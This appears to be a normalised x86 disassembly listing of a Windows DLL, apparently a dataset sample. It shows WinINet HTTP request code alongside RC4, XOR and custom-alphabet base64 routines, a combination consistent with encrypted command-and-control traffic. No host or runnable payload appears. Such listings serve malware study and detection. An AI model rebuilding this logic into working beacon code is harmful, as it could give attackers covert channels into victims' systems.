mov esp ebp
pop ebp
retn 0x4
sub_100120a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002d2d8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor esi esi
mov ebx ecx
mov [ ebp - 0x38 ] ebx
cmp eax esi
je r-xdata
xor eax eax
push eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x44 ] esi
call sub_10011af0
push esi
push esi
push esi
push esi
push r--data
mov [ ebp - 0x4 ] esi
call [ InternetOpenW@IAT ]
mov edi eax
mov [ ebp - 0x34 ] edi
cmp edi esi
jne r-xdata
cmp [ ebx + 0x34 ] 0x8
lea eax [ ebx + 0x20 ]
jb r-xdata
cmp [ ebp - 0x18 ] 0x10
mov [ ebx + 0x40 ] 0x0
jb r-xdata
push esi
push esi
push 0x3
push esi
push esi
push 0x50
push eax
push edi
call [ InternetConnectW@IAT ]
mov [ ebp - 0x3c ] eax
cmp eax esi
jne r-xdata
mov eax [ eax ]
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10019ce4
add esp 0x4
jmp r-xdata
cmp [ ebp - 0x18 ] 0x10
mov ecx [ ebp - 0x2c ]
jae r-xdata
push edi
mov [ ebx + 0x40 ] 0x0
call [ InternetCloseHandle@IAT ]
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push esi
push esi
push esi
push esi
push esi
push ecx
push r--data
push eax
call [ HttpOpenRequestA@IAT ]
mov esi eax
test esi esi
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov edx [ ebp - 0x2c ]
push edx
call sub_10019ce4
add esp 0x4
jmp r-xdata
push esi
mov ecx ebx
call sub_10010cc0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call [ HttpSendRequestW@IAT ]
test eax eax
je r-xdata
mov esi [ InternetCloseHandle@IAT ]
push edi
mov [ ebx + 0x40 ] al
call esi
mov eax [ ebp - 0x3c ]
push eax
call esi
mov ecx ebx
mov [ ebx + 0x40 ] 0x0
call sub_10011ee0
push 0x0
lea ecx [ ebp - 0x30 ]
push ecx
push 0x0
push 0x15
push esi
mov [ ebp - 0x30 ] 0x0
call [ HttpQueryInfoW@IAT ]
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
lea ecx [ ebp - 0x2c ]
call sub_100032c0
mov edi [ ebp - 0x44 ]
cmp edi 0x4
jb r-xdata
mov [ ebx + 0x40 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x30 ]
push 0x1
push edx
call sub_1001a8ef
add esp 0x8
push 0x0
mov edi eax
lea eax [ ebp - 0x30 ]
push eax
push edi
push 0x13
push esi
call [ HttpQueryInfoW@IAT ]
cmp [ edi ] 0x300032
jne r-xdata
push 0x8
call sub_1001a818
add esp 0x4
test eax eax
je r-xdata
mov ebx [ InternetCloseHandle@IAT ]
push edi
call ebx
mov ecx [ ebp - 0x3c ]
push ecx
call ebx
push esi
call ebx
mov esi [ ebp - 0x4c ]
test esi esi
je r-xdata
push edi
mov [ ebx + 0x40 ] 0x1
call sub_1001a3eb
mov edx [ ebp - 0x34 ]
mov edi [ InternetCloseHandle@IAT ]
add esp 0x4
push edx
call edi
mov eax [ ebp - 0x3c ]
push eax
call edi
push esi
call edi
jmp r-xdata
cmp [ edi + 0x4 ] 0x30
jne r-xdata
lea ecx [ ebp - 0x2c ]
xor esi esi
call sub_100032c0
mov eax esi
jmp r-xdata
mov [ eax ] esi
lea ecx [ ebp - 0x2c ]
mov [ eax + 0x4 ] edi
mov esi eax
call sub_100032c0
mov eax esi
jmp r-xdata
cmp [ edi + 0x5 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x4
push edi
call sub_1001a3eb
add esp 0x4
push 0x0
lea ecx [ ebp - 0x50 ]
push ecx
lea edx [ ebp - 0x30 ]
push edx
push 0x20000005
push esi
mov [ ebp - 0x50 ] 0x4
call [ HttpQueryInfoW@IAT ]
test eax eax
je r-xdata
mov edi [ ebp - 0x34 ]
mov eax [ ebp - 0x30 ]
cmp eax 0x7
jbe r-xdata
xor ecx ecx
push 0x1
push eax
xor ebx ebx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x40 ] ecx
call sub_1001a8ef
mov edi eax
add esp 0x8
test edi edi
je r-xdata
mov ebx [ ebp - 0x38 ]
mov edi edi
mov eax [ ebp - 0x30 ]
lea ecx [ ebp - 0x48 ]
push ecx
push eax
lea edx [ edi + ebx ]
push edx
push esi
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
add ebx [ ebp - 0x48 ]
mov eax [ ebp - 0x30 ]
cmp ebx eax
jb r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x40 ]
push eax
push esi
call [ InternetQueryDataAvailable@IAT ]
mov eax [ ebp - 0x40 ]
test eax eax
je r-xdata
jmp r-xdata
lea ecx [ ebp - 0x44 ]
push ecx
mov ecx [ rw-data ]
sub eax ecx
add ecx edi
push eax
push ecx
mov ecx [ ebp - 0x38 ]
call sub_10010870
push edi
mov [ ebp - 0x4c ] eax
call sub_1001a3eb
add esp 0x4
sub_100123a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002d308
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edx eax
mov [ ecx + 0x4 ] ax
shr eax 0x18
shr edx 0x10
lea ebx [ ecx + 0x8 ]
mov [ ecx + 0x6 ] dl
mov [ ecx + 0x7 ] al
mov eax [ ebx + 0x4 ]
mov ecx [ ebx ]
mov [ ebp - 0x4 ] 0x0
cmp ecx eax
je r-xdata
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
mov esi ecx
sub esi edi
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0xd ] 0x0
je r-xdata
mov edx [ ebp + 0x18 ]
push edx
push ecx
push eax
push eax
call sub_10003fd0
mov edx [ ebx + 0x4 ]
mov esi eax
mov eax [ ebp + 0x18 ]
push eax
lea ecx [ ebx + 0xc ]
push ecx
push edx
push esi
call sub_100024a0
add esp 0x20
mov [ ebx + 0x4 ] esi
test edi edi
je r-xdata
xor esi esi
lea esp [ esp ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov ebx ecx
mov esi edi
cmp edi ecx
je r-xdata
lea ecx [ esi * 8 ]
sub ecx esi
lea edx [ edi + ecx * 4 ]
push edx
mov ecx ebx
call sub_10005590
mov al [ ebp - 0xd ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
inc al
movzx esi al
mov [ ebp - 0xd ] al
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
mov ecx [ ebp + 0x10 ]
push edi
call sub_10019ce4
add esp 0x4
mov edi 0x7
xor edx edx
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] 0x0
mov [ esi ] dx
add esi 0x1c
cmp esi ebx
jne r-xdata
mov ecx [ esi ]
push ecx
call sub_10019ce4
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov edi [ ebp + 0xc ]
sub_100124e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002d34b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov edi ecx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x34 ] ebx
mov ax [ rw-data ]
mov cl [ rw-data ]
mov dl [ rw-data ]
push 0x18
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x40 ] ax
mov [ ebp - 0x3e ] cl
mov [ ebp - 0x3d ] dl
call sub_1001a818
add esp 0x4
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
xor esi esi
mov ecx eax
call sub_10012700
mov esi eax
jmp r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10019ce4
add esp 0x4
push 0xc
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] bl
call sub_10012790
push 0x3c
push rw-data
mov ecx esi
call sub_10012770
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
call sub_10012c50
push eax
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x4 ] 0x2
call sub_100080b0
cmp [ ebp - 0x18 ] 0x8
mov [ ebp - 0x4 ] bl
jb r-xdata
mov esi [ ebp - 0x3c ]
push 0xffffffff
push ebx
push esi
lea ecx [ edi + 0x20 ]
call sub_100019e0
mov cl [ ebp - 0x3e ]
mov dx [ ebp - 0x40 ]
sub esp 0x14
mov eax esp
mov [ eax + 0x2 ] cl
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x44 ] esp
mov [ eax ] dx
mov dl [ ebp - 0x3d ]
push ecx
lea ecx [ eax + 0x4 ]
mov [ eax + 0x3 ] dl
call sub_100025c0
mov edx [ edi ]
mov eax [ edx + 0x18 ]
mov ecx edi
call eax
cmp esi ebx
je r-xdata
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x38 ]
cmp esi edi
je r-xdata
mov eax [ ebp - 0x3c ]
push eax
call sub_10019ce4
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] dx
add esi 0x1c
cmp esi edi
jne r-xdata
mov ecx [ esi ]
push ecx
call sub_10019ce4
add esp 0x4
sub_10012660
push ebp
mov ebp esp
push 0xffffffff
push sub_1002d383
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
xor eax eax
mov [ esi + 0x4 ] ax
mov [ esi + 0x6 ] ax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov [ esi ] r--data
xor ecx ecx
mov [ esi + 0x34 ] 0x7
mov [ esi + 0x30 ] eax
mov [ ebp - 0x4 ] eax
mov [ esi + 0x20 ] cx
push 0x1
push 0xf
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x40 ] al
mov [ esi + 0x3c ] eax
mov [ esi + 0x1c ] 0xf
call sub_1001a8ef
add esp 0x8
mov ecx esi
mov [ esi + 0x18 ] eax
call sub_100124e0
mov ecx esi
call sub_10010a90
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_10012710
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
mov eax ecx
xor ecx ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] edx
mov edx [ ebp + 0x10 ]
mov [ eax ] ecx
mov [ eax + 0x8 ] edx
pop ebp
retn 0x10
sub_10012740
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
je r-xdata
push eax
call sub_1001a3eb
add esp 0x4
pop esi
retn
push esi
call sub_1001a3eb
add esp 0x4
sub_100127b0
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov esi [ ecx ]
mov [ ebp - 0x4 ] ecx
test esi esi
je r-xdata
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ecx + 0x4 ]
test ebx ebx
je r-xdata
push edi
lea eax [ ebx + 0x2 ]
push 0x1
push eax
call sub_1001a8ef
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
mov ecx ebx
cmp ecx 0xffffffff
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x8 ]
mov dl [ ecx ]
xor dl [ esi ]
mov eax edi
mov [ edi ] dl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov ebx [ edx + 0xc ]
mov eax edx
mov edx [ eax + 0x8 ]
mov [ ebp - 0x8 ] edx
lea esp [ esp ]
xor edx edx
mov eax ecx
div ebx
mov eax [ ebp - 0x8 ]
dec ecx
mov dl [ edx + eax ]
xor dl [ esi + ecx ]
xor dl [ esi + ecx + 0x1 ]
mov [ ecx + edi + 0x1 ] dl
cmp ecx 0xffffffff
jg r-xdata
sub_10012840
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
push esi
push edi
push 0x1
push eax
mov [ ebp - 0x4 ] ecx
call sub_1001a8ef
mov esi eax
add esp 0x8
lea edi [ esi + 0x1a ]
xor ecx ecx
sub eax edi
push ebx
lea edx [ edi + ecx ]
lea ebx [ ecx + 0x41 ]
mov [ eax + edx ] bl
lea ebx [ ecx + 0x61 ]
inc ecx
mov [ edx ] bl
cmp ecx 0x1a
jl r-xdata
xor ecx ecx
pop ebx
lea ebx [ ebx ]
lea edx [ ecx + 0x30 ]
mov [ esi + ecx + 0x34 ] dl
inc ecx
cmp ecx 0xa
jl r-xdata
mov al [ ebp + 0x8 ]
cmp al [ rw-data ]
jne r-xdata
cmp al [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x3e ] 0x5f2d
mov [ ecx + 0x14 ] esi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x4 ]
mov [ esi + 0x3e ] 0x2f2b
mov [ edx + 0x10 ] esi
sub_100128c0
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0xc ]
push ebx
lea ebx [ eax + eax + 0x8000 ]
push esi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
and ebx 0xffff8000
push edi
add ebx 0x8000
add eax ebx
push 0x1
push eax
xor esi esi
call sub_1001a8ef
mov ecx [ ebp + 0x10 ]
mov edi eax
add esp 0x8
mov [ ebp - 0xc ] edi
mov [ ecx ] esi
test edi edi
jne r-xdata
mov edx [ rw-data ]
mov ecx [ ebp + 0x14 ]
push edx
lea eax [ edi + ebx ]
push ecx
push eax
mov [ ebp - 0x8 ] eax
call sub_10019cf0
mov ebx [ ebp + 0x8 ]
add esp 0xc
cmp [ ebp + 0xc ] 0x3
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax 0xaaaaaaab
mul [ ebp + 0xc ]
shr edx 0x1
mov [ ebp + 0x14 ] edx
lea ecx [ ecx ]
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp eax 0x1
jbe r-xdata
mov edi [ ebp + 0x10 ]
mov ebx [ edi ]
mov edi [ ebp - 0x8 ]
mov edx eax
and edx 0x3f
mov dl [ edx + edi ]
mov edi [ ebp - 0xc ]
sub ebx ecx
mov [ ebx + edi + 0x3 ] dl
mov edx 0x1
shr eax 0x6
add ecx edx
sub [ ebp + 0xc ] edx
jne r-xdata
mov eax [ ebp + 0x10 ]
sub [ ebp - 0x4 ] 0x3
add [ eax ] 0x4
sub [ ebp + 0x14 ] edx
mov ebx [ ebp + 0x8 ]
jne r-xdata
movzx eax [ esi + ebx ]
shl eax 0x10
movzx ecx [ esi + ebx ]
movzx eax [ esi + ebx + 0x1 ]
shl ecx 0x8
add eax ecx
shl eax 0x8
jmp r-xdata
movzx eax [ esi + ebx ]
movzx ecx [ esi + ebx + 0x1 ]
shl eax 0x8
xor ecx eax
movzx eax [ esi + ebx + 0x2 ]
shl ecx 0x8
xor eax ecx
add esi 0x3
xor ecx ecx
mov [ ebp + 0xc ] 0x4
mov esi [ ebp + 0x10 ]
mov esi [ esi ]
mov ebx [ ebp - 0x8 ]
mov edx eax
and edx 0x3f
mov dl [ edx + ebx ]
sub esi ecx
mov [ esi + edi + 0x3 ] dl
mov edx 0x1
shr eax 0x6
add ecx edx
sub [ ebp + 0xc ] edx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov esi [ eax ]
mov cl 0x3d
mov [ esi + edi + 0x3 ] cl
cmp [ ebp - 0x4 ] edx
jne r-xdata
xor ecx ecx
mov [ ebp + 0xc ] 0x4
lea ecx [ ecx ]
add [ eax ] 0x4
mov edx [ eax ]
mov [ edx + edi + 0x2 ] cl
sub_10012a20
push ebp
mov ebp esp
sub esp 0x8
push ebx
push 0x1
push 0x100
call sub_1001a8ef
mov ecx [ ebp + 0x14 ]
mov ebx eax
add esp 0x8
mov [ ebp - 0x8 ] ebx
xor al al
movsx edx [ ecx ]
mov [ edx + ebx ] al
inc al
inc ecx
cmp al 0x40
jb r-xdata
mov ecx [ ebp + 0xc ]
test cl 0x3
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax ecx
shr eax 0x2
cmp [ edx + ecx - 0x1 ] 0x3d
lea eax [ eax + eax * 2 ]
mov [ ebp + 0x14 ] eax
jne r-xdata
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ edx + ecx - 0x2 ] 0x3d
jne r-xdata
dec eax
mov [ ebp + 0x14 ] eax
mov ecx [ ebp + 0x10 ]
push edi
push 0x1
push eax
mov [ ecx ] eax
call sub_1001a8ef
mov edi eax
add esp 0x8
mov [ ebp - 0x4 ] edi
test edi edi
jne r-xdata
dec eax
mov [ ebp + 0x14 ] eax
push esi
xor eax eax
xor esi esi
cmp [ ebp + 0xc ] eax
jbe r-xdata
push ebx
call sub_1001a3eb
add esp 0x4
pop edi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x10
push ebx
call sub_1001a3eb
add esp 0x4
pop esi
mov eax edi
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x10
lea ecx [ ecx ]
movsx edx cl
movsx ecx [ edx + ebx ]
xor ecx ecx
jmp r-xdata
movsx edx dl
movsx edx [ edx + ebx ]
mov [ ebp + 0x10 ] edx
mov [ ebp + 0x10 ] 0x0
jmp r-xdata
mov dl [ eax + edi + 0x1 ]
inc eax
inc eax
cmp dl 0x3d
jne r-xdata
movsx edx dl
movsx edi [ edx + ebx ]
xor edi edi
jmp r-xdata
mov dl [ eax + edi ]
cmp dl 0x3d
jne r-xdata
movsx edx dl
movsx edx [ edx + ebx ]
xor edx edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov dl [ eax + edx + 0x1 ]
inc eax
cmp dl 0x3d
jne r-xdata
mov ebx [ ebp - 0x8 ]
cmp eax [ ebp + 0xc ]
jb r-xdata
mov ebx ecx
sar ebx 0x10
mov [ esi + edi ] bl
inc esi
cmp esi edx
jae r-xdata
shl ecx 0x6
add ecx [ ebp + 0x10 ]
inc eax
shl ecx 0x6
add ecx edi
mov edi [ ebp - 0x4 ]
shl ecx 0x6
add ecx edx
mov edx [ ebp + 0x14 ]
cmp esi edx
jae r-xdata
mov edi [ ebp + 0x8 ]
mov cl [ eax + edi ]
cmp cl 0x3d
jne r-xdata
mov ebx ecx
sar ebx 0x8
mov [ esi + edi ] bl
inc esi
cmp esi edx
jae r-xdata
mov [ esi + edi ] cl
inc esi
sub_10012b90
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x0
jne r-xdata
mov ecx [ esi + 0x14 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
push eax
push ecx
mov ecx esi
call sub_10012a20
pop esi
pop ebp
retn 0xc
movzx eax [ rw-data ]
push eax
call sub_10012840
sub_10012bd0
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x0
jne r-xdata
mov ecx [ esi + 0x14 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
push eax
push ecx
mov ecx esi
call sub_100128c0
pop esi
pop ebp
retn 0xc
movzx eax [ rw-data ]
push eax
call sub_10012840
sub_10012c10
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov ecx [ esi + 0x10 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
push eax
push ecx
mov ecx esi
call sub_100128c0
pop esi
pop ebp
retn 0xc
movzx eax [ rw-data ]
push eax
call sub_10012840
sub_10012c50
push ebp
mov ebp esp
push 0xffffffff
push sub_1002d3a8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x30 ] ebx
call sub_100127b0
mov edi eax
cmp edi ebx
jne r-xdata
xor ecx ecx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] cx
lea edx [ eax + 0x2 ]
lea ecx [ ecx ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] ax
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
lea ecx [ ebp - 0x2c ]
call sub_100034e0
push edi
mov [ ebp - 0x4 ] ebx
call sub_1001a3eb
add esp 0x4
lea eax [ ebp - 0x2c ]
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push eax
mov ecx esi
mov [ esi ] dx
call sub_10003860
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push ebx
mov ecx esi
call sub_100034e0
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10019ce4
add esp 0x4
sub_10012d50
push ebp
mov ebp esp
push 0xffffffff
push sub_1002d3d8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x30 ] ebx
call sub_100127b0
mov edi eax
cmp edi ebx
jne r-xdata
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
lea edx [ eax + 0x1 ]
xor eax eax
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
lea edx [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push edi
lea ecx [ ebp - 0x2c ]
call sub_10007470
push edi
mov [ ebp - 0x4 ] ebx
call sub_1001a3eb
add esp 0x4
lea eax [ ebp - 0x2c ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push eax
mov ecx esi
mov [ esi ] bl
call sub_100076f0
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push ebx
mov ecx esi
call sub_10007470
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10019ce4
add esp 0x4
sub_10012e30
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ rw-data ]
lea eax [ ecx + 0x4 ]
mov [ esi + 0x4 ] al
cmp ebx ecx
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
movzx edi al
push 0x1
push edi
call sub_1001a8ef
mov ecx [ ebp + 0x8 ]
push ebx
push ecx
push edi
push eax
mov [ esi ] eax
call sub_1001a92f
add esp 0x18
pop edi
sub_10012e70
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
push esi
xor esi esi
mov [ ebp - 0x4 ] esi
cmp edx esi
jbe r-xdata
mov ax [ ebp - 0x4 ]
pop esi
mov esp ebp
pop ebp
retn 0xc
mov cx [ ebp + 0x8 ]
push ebx
push edi
mov edi [ ebp + 0xc ]
mov edi edi
shr [ ebp - 0x4 ] 0x1
mov bx [ ebp - 0x4 ]
shr bx 0x1
xor bx cx
movzx ebx bx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
shr [ ebp - 0x4 ] 0x1
mov bx [ ebp - 0x4 ]
shr bx 0x1
xor bx cx
movzx ebx bx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
shr al 0x1
mov bl al
xor bl [ ebp - 0x4 ]
test bl 0x1
je r-xdata
shr [ ebp - 0x4 ] 0x1
mov bx [ ebp - 0x4 ]
shr bx 0x1
xor bx cx
movzx ebx bx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
shr al 0x1
mov bl al
xor bl [ ebp - 0x4 ]
test bl 0x1
je r-xdata
shr [ ebp - 0x4 ] 0x1
mov bx [ ebp - 0x4 ]
shr bx 0x1
xor bx cx
movzx ebx bx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
shr al 0x1
mov bl al
xor bl [ ebp - 0x4 ]
test bl 0x1
je r-xdata
shr [ ebp - 0x4 ] 0x1
mov bx [ ebp - 0x4 ]
shr bx 0x1
xor bx cx
movzx ebx bx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
shr al 0x1
mov bl al
xor bl [ ebp - 0x4 ]
test bl 0x1
je r-xdata
shr [ ebp - 0x4 ] 0x1
mov bx [ ebp - 0x4 ]
shr bx 0x1
xor bx cx
movzx ebx bx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
shr al 0x1
mov bl al
xor bl [ ebp - 0x4 ]
test bl 0x1
je r-xdata
shr [ ebp - 0x4 ] 0x1
mov bx [ ebp - 0x4 ]
shr bx 0x1
xor bx cx
movzx ebx bx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
shr al 0x1
mov bl al
xor bl [ ebp - 0x4 ]
test bl 0x1
je r-xdata
shr [ ebp - 0x4 ] 0x1
mov ax [ ebp - 0x4 ]
shr ax 0x1
xor ax cx
movzx eax ax
mov [ ebp - 0x4 ] eax
jmp r-xdata
shr al 0x1
xor al [ ebp - 0x4 ]
test al 0x1
je r-xdata
mov al [ esi + edi ]
mov bl al
xor bl [ ebp - 0x4 ]
test bl 0x1
je r-xdata
pop edi
pop ebx
inc esi
cmp esi edx
jb r-xdata
sub_10012fc0
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
push 0x1
push 0x100
mov ebx ecx
call sub_1001a8ef
movzx ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov esi eax
push 0x4
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ecx + edx - 0x4 ]
push 0x4
push eax
call sub_1001a92f
add esp 0x18
xor eax eax
mov [ eax + esi ] al
inc eax
cmp eax 0x100
jne r-xdata
movzx edx [ ebx + 0x4 ]
mov eax [ ebx ]
xor edi edi
xor ecx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] eax
movzx edx [ ecx + esi ]
mov [ ebp - 0x1 ] dl
xor edx edx
mov eax ecx
div [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
inc ecx
movzx edx [ edx + eax ]
mov al [ ebp - 0x1 ]
add edi edx
movzx ebx al
add edi ebx
and edi 0xff
movzx edx [ edi + esi ]
mov [ ecx + esi - 0x1 ] dl
mov [ edi + esi ] al
cmp ecx 0x100
jne r-xdata
xor eax eax
xor ecx ecx
xor edi edi
cmp [ ebp + 0xc ] eax
jbe r-xdata
push esi
call sub_1001a3eb
add esp 0x4
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn 0xc
inc ecx
and ecx 0xff
mov dl [ ecx + esi ]
movzx ebx dl
add eax ebx
and eax 0xff
mov bl [ eax + esi ]
mov [ eax + esi ] dl
movzx edx bl
mov [ ecx + esi ] bl
movzx ebx [ eax + esi ]
add edx ebx
